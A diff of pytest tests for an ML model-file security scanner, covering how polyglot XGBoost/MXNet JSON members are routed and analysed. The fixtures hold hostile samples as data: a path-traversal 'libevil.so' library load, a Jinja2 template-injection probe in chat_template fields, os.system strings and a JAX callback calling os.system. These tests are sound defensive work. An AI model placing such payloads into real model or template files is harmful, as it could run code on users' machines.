+        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert result.success is False
+    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "XGBoost / MXNet JSON Routing" and check.details.get("duplicate_root_keys") == ["nodes"]
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_mxnet_only_selection_preserves_overlap_security_analysis(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "polyglot.json"
+    extracted_member.write_text(
+        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["mxnet"], "cache_enabled": False})
+
+    assert result.scanner_name == "mxnet"
+    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
+    assert "xgboost" in result.metadata["skipped_scanner_ids"]
+    xgboost_selection_checks = [
+        check
+        for check in result.checks
+        if check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "xgboost"
+    ]
+    assert len(xgboost_selection_checks) == 1
+    assert xgboost_selection_checks[0].details.get("kind") == "preferred"
+
+
+def test_scan_nested_file_mxnet_only_selection_fails_closed_for_bounded_xgboost_overlap(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    monkeypatch.setattr(archive_dispatch, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    extracted_member = tmp_path / "polyglot.json"
+    extracted_member.write_text(
+        '{"version":[1,7,4],"learner":{"gradient_booster":{}},"nodes":[{"op":"Custom","name":"load",'
+        '"attrs":{"library":"../../tmp/libevil.so","padding":"' + ("x" * 256) + '"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["mxnet"], "cache_enabled": False})
+
+    assert result.success is False
+    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
+    assert "xgboost" in result.metadata["skipped_scanner_ids"]
+    assert any(
+        check.name == "Scanner Selection"
+        and check.details.get("skipped_scanner_id") == "xgboost"
+        and check.details.get("context") == "overlapping JSON analysis"
+        and check.details.get("kind") == "preferred"
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_xgboost_only_selection_skips_overlap_mxnet_analysis(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "polyglot.json"
+    extracted_member.write_text(
+        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert result.success is True
+    assert not any(issue.details.get("attribute") == "library" for issue in result.issues)
+    assert "mxnet" in result.metadata["skipped_scanner_ids"]
+    assert "xgboost_mxnet_symbol_overlap" not in result.metadata.get("scan_outcome_reasons", [])
+    assert any(
+        check.name == "Scanner Selection"
+        and check.details.get("skipped_scanner_id") == "mxnet"
+        and check.details.get("kind") == "embedded"
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_does_not_cap_canonical_json_overlap_to_renamed_probe_budget(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
+    monkeypatch.setattr(archive_dispatch, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
+    extracted_member = tmp_path / "polyglot.json"
+    extracted_member.write_text(
+        '{"version":[1,7,4],"learner":{"gradient_booster":{},"malicious_code":"os.system()",'
+        '"padding":"'
+        + ("x" * 600)
+        + '"},"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)
+    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
+    assert "max_file_read_size_exceeded" not in result.metadata.get("scan_outcome_reasons", [])
+
+
+def test_scan_nested_file_routes_xgboost_json_with_markers_after_mxnet_probe_budget(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    extracted_member = tmp_path / "delayed-booster.json"
+    extracted_member.write_text(
+        '{"padding":"' + ("x" * 256) + '","version":[1,7,4],'
+        '"learner":{"gradient_booster":{},"malicious_code":"os.system()"}}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
+    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)
+
+
+def test_scan_nested_file_polyglot_manifest_preserves_jinja_analysis(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "config.json"
+    extracted_member.write_text(
+        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
+        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_polyglot_manifest_honors_excluded_jinja_selection(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "config.json"
+    extracted_member.write_text(
+        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
+        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(
+        str(extracted_member),
+        {"scanners": ["xgboost", "mxnet", "manifest"], "cache_enabled": False},
+    )
+
+    assert result.scanner_name == "xgboost"
+    assert "jinja2_template" in result.metadata["skipped_scanner_ids"]
+    assert not any(check.name == "Jinja2 Template Injection Detection" for check in result.checks)
+
+
+def test_zip_scan_preserves_skipped_scanner_ids_from_multiple_members(tmp_path: Path) -> None:
+    archive_path = tmp_path / "model.zip"
+    with zipfile.ZipFile(archive_path, "w") as archive:
+        archive.writestr(
+            "overlap.json",
+            '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+            '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
+        )
+        archive.writestr(
+            "config.json",
+            '{"chat_template":"{{ user }}","nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
+        )
+
+    result = ZipScanner({"scanners": ["zip", "mxnet", "manifest"], "cache_enabled": False}).scan(str(archive_path))
+
+    assert set(result.metadata["skipped_scanner_ids"]) >= {"xgboost", "jinja2_template"}
+    selection_ids = {
+        check.details.get("skipped_scanner_id") for check in result.checks if check.name == "Scanner Selection"
+    }
+    assert selection_ids >= {"xgboost", "jinja2_template"}
+
+
+def test_scan_nested_file_xgboost_manifest_preserves_jinja_analysis(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "config.json"
+    extracted_member.write_text(
+        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_inconclusive_mxnet_config_preserves_jinja_analysis(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
+    extracted_member = tmp_path / "config.json"
+    extracted_member.write_text(
+        '{"heads":[[0,0,0]],"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","nodes":[{"attrs":"'
+        + ("x" * 300)
+        + '","op":"Custom","name":"load"}],"arg_nodes":[0]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.success is False
+    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_inconclusive_mxnet_tokenizer_config_preserves_direct_jinja_analysis(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
+    extracted_member = tmp_path / "tokenizer_config.json"
+    extracted_member.write_text(
+        '{"heads":[[0,0,0]],"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","nodes":[{"attrs":"'
+        + ("x" * 300)
+        + '","op":"Custom","name":"load"}],"arg_nodes":[0]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.success is False
+    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_inconclusive_mxnet_generation_config_runs_selected_jinja_when_manifest_excluded(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
+    extracted_member = tmp_path / "generation_config.json"
+    extracted_member.write_text(
+        '{"heads":[[0,0,0]],"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","nodes":[{"attrs":"'
+        + ("x" * 300)
+        + '","op":"Custom","name":"load"}],"arg_nodes":[0]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["jinja2_template"], "cache_enabled": False})
+
+    assert result.success is False
+    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
+    assert "manifest" in result.metadata["skipped_scanner_ids"]
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_inconclusive_mxnet_malformed_generation_config_runs_jinja_after_manifest_parse_failure(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
+    extracted_member = tmp_path / "generation_config.json"
+    extracted_member.write_text(
+        '{"heads":[[0,0,0]],"arg_nodes":[0],'
+        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","padding":"' + ("x" * 300),
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(
+        str(extracted_member),
+        {"scanners": ["manifest", "jinja2_template"], "cache_enabled": False},
+    )
+
+    assert result.success is False
+    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
+    assert "manifest_parse_failed" in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_mxnet_shaped_tokenizer_config_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "tokenizer_config.json"
+    extracted_member.write_text(
+        '{"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
+        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "mxnet"
+    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_mxnet_manifest_honors_excluded_jinja_selection(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "config.json"
+    extracted_member.write_text(
+        '{"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
+        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(
+        str(extracted_member),
+        {"scanners": ["mxnet", "manifest"], "cache_enabled": False},
+    )
+
+    assert result.scanner_name == "mxnet"
+    assert "jinja2_template" in result.metadata["skipped_scanner_ids"]
+    assert not any(check.name == "Jinja2 Template Injection Detection" for check in result.checks)
+
+
+def test_scan_nested_file_mxnet_generation_config_runs_selected_jinja_when_manifest_excluded(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "generation_config.json"
+    extracted_member.write_text(
+        '{"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
+        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(
+        str(extracted_member),
+        {"scanners": ["mxnet", "jinja2_template"], "cache_enabled": False},
+    )
+
+    assert result.scanner_name == "mxnet"
+    assert "manifest" in result.metadata["skipped_scanner_ids"]
+    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_mxnet_routed_tokenizer_duplicate_override_preserves_direct_jinja_analysis(
+    tmp_path: Path,
+) -> None:
+    extracted_member = tmp_path / "tokenizer_config.json"
+    extracted_member.write_text(
+        '{"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",'
+        '"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(
+        str(extracted_member),
+        {"scanners": ["mxnet", "jinja2_template"], "cache_enabled": False},
+    )
+
+    assert result.scanner_name == "mxnet"
+    assert "mxnet_symbol_invalid_structure" in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_xgboost_chat_template_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "chat_template.json"
+    extracted_member.write_text(
+        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}"}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_malformed_xgboost_chat_template_preserves_direct_jinja_analysis(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "chat_template.json"
+    extracted_member.write_text(
+        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}",',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(
+        str(extracted_member),
+        {"scanners": ["xgboost", "jinja2_template"], "cache_enabled": False},
+    )
+
+    assert result.scanner_name == "xgboost"
+    assert "xgboost_json_parse_failed" in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_keeps_oversized_renamed_overlap_on_bounded_mxnet_route(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
+    monkeypatch.setattr(archive_dispatch, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
+    monkeypatch.setattr("modelaudit.scanners.mxnet_scanner.MAX_SYMBOL_READ_BYTES", 512)
+    extracted_member = tmp_path / "payload.meta"
+    extracted_member.write_text(
+        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
+        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"' + ("x" * 600) + '"}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "mxnet"
+    assert result.success is False
+    assert "mxnet_symbol_truncated" in result.metadata["scan_outcome_reasons"]
+    assert "mxnet_symbol_parse_failed" in result.metadata["scan_outcome_reasons"]
+    assert not any(check.name == "JSON Parsing" for check in result.checks)
+
+
+@pytest.mark.parametrize("version", ["[1,7,4]", '"malformed"'])
+def test_scan_nested_file_xgboost_only_oversized_renamed_overlap_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    version: str,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
+    monkeypatch.setattr(archive_dispatch, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
+    extracted_member = tmp_path / "payload.meta"
+    extracted_member.write_text(
+        '{"version":' + version + ',"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
+        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"' + ("x" * 600) + '"}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})
+
+    assert result.scanner_name == "xgboost"
+    assert result.success is False
+    assert "max_file_read_size_exceeded" in result.metadata["scan_outcome_reasons"]
+    assert any(check.name == "File Size Limit" for check in result.checks)
+
+
+def test_scan_nested_file_symbol_routed_params_preserves_raw_text_findings(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
+    monkeypatch.setattr(archive_dispatch, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
+    monkeypatch.setattr("modelaudit.scanners.mxnet_scanner.MAX_SYMBOL_READ_BYTES", 512)
+    extracted_member = tmp_path / "payload-0000.params"
+    extracted_member.write_text(
+        '{"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
+        '"version":[1,7,4],"learner":{"malicious_code":"os.system()"},"padding":"' + ("x" * 1024) + '"}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "mxnet"
+    assert any("Suspicious executable token" in issue.message for issue in result.issues)
+    assert "mxnet_symbol_truncated" in result.metadata["scan_outcome_reasons"]
+
+
+@pytest.mark.parametrize("filename", ["payload.dat", "payload.meta"])
+def test_scan_nested_file_fails_closed_when_mxnet_structure_is_beyond_bounded_probe(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    filename: str,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    extracted_member = tmp_path / filename
+    extracted_member.write_text(
+        (" " * 129) + '{"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
 
     result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
 
     assert result.scanner_name == "unknown"
     assert result.success is False
-    assert result.metadata["operational_error_reason"] == "protobuf_model_routing_incomplete"
-    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
-    check = next(check for check in result.checks if check.name == "Protobuf Model Routing")
-    assert "tentative protobuf analysis was unavailable" in check.message
+    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
+    check = next(check for check in result.checks if check.name == "MXNet Symbol Routing")
+    assert "bounded JSON probe reached its limit" in check.message
 
 
-def test_scan_nested_file_keeps_budget_exhausted_coreml_candidate_owned_by_extension(
+def test_scan_nested_file_inconclusive_mxnet_route_composes_jax_analysis(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    extracted_member = tmp_path / "model.mlmodel"
-    extracted_member.write_bytes(b"\x42\x00" * 4097)
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    extracted_member = tmp_path / "ambiguous-jax.dat"
+    extracted_member.write_text(
+        '{"framework":"jax","nodes":[{"attrs":"'
+        + ("x" * 129)
+        + '","op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]],'
+        '"payload":"jax.experimental.host_callback.call(os.system, \'id\')"}',
+        encoding="utf-8",
+    )
 
-    monkeypatch.setattr(_registry, "load_scanner_by_id", lambda _scanner_id: None)
-    monkeypatch.setattr(_registry, "get_scanner_for_path", lambda _path: None)
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "unknown"
+    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_scan_nested_file_inconclusive_mxnet_route_composes_escaped_suffix_owned_jax_payload_without_root_marker(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    extracted_member = tmp_path / "ambiguous-jax.checkpoint"
+    extracted_member.write_text(
+        json.dumps(
+            {
+                "nodes": [{"attrs": "x" * 129, "op": "Custom", "name": "load"}],
+                "arg_nodes": [0],
+                "heads": [[0, 0, 0]],
+                "payload": "jax.experimental.io_callback",
+            }
+        ).replace("jax.experimental.io_callback", r"j\u0061x.experimental.io_callback"),
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "unknown"
+    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
+    assert any(
+        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
+    )
+
+
+def test_scan_nested_file_inconclusive_mxnet_route_does_not_compose_ambiguous_large_foreign_json(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    extracted_member = tmp_path / "ambiguous-large-foreign.dat"
+    extracted_member.write_text(
+        json.dumps(
+            {
+                "nodes": [{"attrs": "x" * 129, "op": "Custom", "name": "load"}],
+                "arg_nodes": [0],
+                "heads": [[0, 0, 0]],
+                "padding": "x" * (file_detection.JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 16),
+            }
+        ),
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "unknown"
+    assert result.metadata["scan_outcome_reasons"] == ["mxnet_symbol_routing_incomplete"]
+    assert not any(check.name == "JSON Checkpoint Analysis Limit" for check in result.checks)
+
+
+def test_scan_nested_file_inconclusive_mxnet_route_preserves_jax_incomplete_reason(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    nested_payload: dict[str, Any] = {"value": "safe"}
+    for _ in range(2 * JaxCheckpointScanner._MAX_METADATA_TRAVERSAL_DEPTH):
+        nested_payload = {"nested": nested_payload}
+    extracted_member = tmp_path / "ambiguous-deep-jax.dat"
+    extracted_member.write_text(
+        json.dumps(
+            {
+                "framework": "jax",
+                "nodes": [{"attrs": "x" * 129, "op": "Custom", "name": "load"}],
+                "arg_nodes": [0],
+                "heads": [[0, 0, 0]],
+                "payload": nested_payload,
+            }
+        ),
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert result.scanner_name == "unknown"
+    assert result.metadata["scan_outcome_reasons"] == [
+        "jax_metadata_traversal_depth_limit",
+        "mxnet_symbol_routing_incomplete",
+    ]
+    assert any(check.name == "JSON Metadata Traversal Depth Limit" for check in result.checks)
+
+
+def test_scan_nested_file_fails_closed_when_mxnet_prefix_exceeds_nesting_budget(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
+    extracted_member = tmp_path / "deep-prefix.dat"
+    extracted_member.write_text(
+        '{"metadata":'
+        + ("[" * 65)
+        + "0"
+        + ("]" * 65)
+        + ',"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"'
+        + ("x" * 129)
+        + '"}',
+        encoding="utf-8",
+    )
 
     result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
 
     assert result.scanner_name == "unknown"
     assert result.success is False
-    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
-    check = next(check for check in result.checks if check.name == "Format Detection")
-    assert check.details["format"] == "coreml"
-    assert check.details["preferred_scanner_id"] == "coreml"
-    assert not any(check.name == "Protobuf Model Routing" for check in result.checks)
+    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
+
+
+def test_scan_nested_file_small_renamed_mxnet_value_budget_before_structure_fails_closed(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "padded.jpg"
+    extracted_member.write_text(
+        '{"padding":['
+        + ",".join("0" for _ in range(5000))
+        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"cache_enabled": False})
+
+    assert extracted_member.stat().st_size < file_detection.MXNET_SYMBOL_SIGNATURE_READ_BYTES
+    assert result.scanner_name == "unknown"
+    assert result.success is False
+    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
+
+
+def test_scan_nested_file_inconclusive_params_routing_preserves_raw_findings(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "payload-0000.params"
+    extracted_member.write_text(
+        '{"metadata":"\u007fELF os.system()","padding":['
+        + ",".join("0" for _ in range(5000))
+        + '],"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["mxnet"], "cache_enabled": False})
+
+    assert result.scanner_name == "unknown"
+    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
+    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
+    assert any("Suspicious executable token" in issue.message for issue in result.issues)
+
+
+def test_scan_nested_file_inconclusive_params_routing_honors_excluded_mxnet(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "payload-0000.params"
+    extracted_member.write_text(
+        '{"metadata":"\u007fELF os.system()","padding":['
+        + ",".join("0" for _ in range(5000))
+        + '],"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
+    result = scan_nested_file(str(extracted_member), {"scanners": ["xgboost"], "cache_enabled": False})
+
+    assert result.metadata["operational_error_reason"] == "mxnet_symbol_routing_incomplete"
+    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
+    assert not any("Suspicious executable token" in issue.message for issue in result.issues)
+    assert "mxnet" in result.metadata["skipped_scanner_ids"]
+    assert any(
+        check.name == "Scanner Selection"
+        and check.details.get("skipped_scanner_id") == "mxnet"
+        and check.details.get("context") == "inconclusive MXNet params byte analysis"
+        and check.details.get("kind") == "embedded"
+        for check in result.checks
+    )
+
+
+def test_scan_nested_file_generic_json_value_budget_before_mxnet_structure_detects_library(tmp_path: Path) -> None:
+    extracted_member = tmp_path / "model.json"
+    extracted_member.write_text(
+        '{"padding":['
+        + ",".join("0" for _ in range(5000))
+        + '],"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
+        '"arg_nodes":[0],"heads":[[0,0,0]]}',
+        encoding="utf-8",
+    )
+
